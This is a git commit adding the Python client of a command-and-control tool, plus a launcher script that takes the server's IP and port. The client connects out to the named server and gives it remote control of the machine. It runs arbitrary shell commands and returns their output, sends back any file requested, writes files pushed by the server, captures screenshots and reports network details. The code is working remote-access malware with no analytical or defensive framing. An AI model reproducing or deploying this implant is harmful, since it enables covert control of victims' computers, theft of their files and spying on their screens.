400a9765ac45116edf1c8990084b784f501cc95b
Mario González <78421275+m4riio21@users.noreply.github.com>
2023-05-01 20:24:47 +0200

    Add files via upload

---
+++ client/Client.py
@@ -0,0 +1,128 @@
+import socket
+import os
+import subprocess
+import struct
+import base64
+import io
+import re
+from PIL import ImageGrab
+
+class Client:
+    """A class representing the client that connects to the server via sockets.
+
+    Attributes:
+        host (str): The IP address of the remote C&C server
+        port (int): The port to connect to the remote C&C server
+    """
+
+    def __init__(self, ip, port):
+        """Initializes a new instance of the Client class.
+
+        Args:
+        ip (str): The IP address of the remote C&C server
+        port (int): The port to connect to the remote C&C server
+        """
+        self.host = ip
+        self.port = port
+        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    def makeConnection(self):
+        """
+        Initializes the connection to the C&C Server, and sends client OS to the server
+        """
+
+        self.server_socket.connect((self.host, self.port))
+
+        #Send client OS
+        if os.name == 'nt':
+            self.server_socket.send(b'WIN')
+        elif os.name == 'posix':
+            self.server_socket.send(b'LIN')
+
+
+    def quitConnection(self):
+        """
+        Close the connection to the C&C Server
+        """
+
+        self.server_socket.close()
+
+    def listenForCommands(self):
+        data = self.server_socket.recv(1024)
+
+        if not data:
+            print("Connection to server has been closed")
+            exit(1)
+
+        if data.startswith(b"command"):
+            command = data[7:].decode()
+            self.executeAndSend(command)
+
+        if data.startswith(b"download"):
+            print(data)
+            file = data[8:].decode()
+            with open(file, 'rb') as f:
+                # send the file contents in chunks
+                chunk = f.read(1024)
+                while chunk:
+                    self.server_socket.sendall(chunk)
+                    chunk = f.read(1024)
+
+        if data.startswith(b"netstat"):
+            self.executeAndSend('netstat -nat')
+
+        if data.startswith(b"interfaces"):
+            if os.name == 'nt':
+                self.executeAndSend('ipconfig')
+            elif os.name == 'posix':
+                self.executeAndSend('ifconfig')
+
+        if data.startswith(b"screenshot"):
+            # Take a screenshot and save it as PNG
+            screenshot = ImageGrab.grab()
+            buffer = io.BytesIO()
+            screenshot.save(buffer, format='PNG')
+            buffer.seek(0)
+
+            #Send screenshot
+            self.server_socket.sendall(buffer.read())
+
+
+        if data.startswith(b"upload"):
+            start_str = b"upload"
+            end_str = b"FILE_START"
+            start_index = data.find(start_str)
+            end_index = data.find(end_str)
+            path = data[start_index + len(start_str):end_index].decode()
+
+            print(path)
+
+            contents = data[end_index+len(end_str):]
+            self.server_socket.settimeout(2)
+            with open(path, 'wb') as f:
+                f.write(contents)
+                while True:
+                    try:
+                        chunk = self.server_socket.recv(1024)
+                        if not chunk:
+                            break
+                        f.write(chunk)
+                    except:
+                        self.server_socket.settimeout(None)
+                        f.close()
+                        return
+                self.server_socket.settimeout(None)
+                f.close()
+                return
+
+    def executeAndSend(self, command):
+        output = os.popen(command).read()
+        print(output)
+        self.server_socket.send(output.encode('utf-8'))
+
+    def start(self):
+        self.makeConnection()
+        while True:
+            self.listenForCommands()
+
+
--- client/main.py
+++ client/main.py
@@ -1,5 +1,23 @@
+from Client import Client
+import argparse
+
 def main():
-    pass
+    parser = argparse.ArgumentParser(description='Client-side connection to the C&C server.')
+    parser.add_argument('ip_address', nargs='?', type=str, help='IP address')
+    parser.add_argument('port_number', nargs='?', type=int, help='Port number')
+
+    args = parser.parse_args()
+
+    if not args.ip_address:
+        print('Please provide an IP address')
+        return
+    if not args.port_number:
+        print('Please provide a port number')
+        return
+
+    c = Client(args.ip_address, args.port_number)
+
+    c.start()
 
 if __name__ == "__main__":
     main()
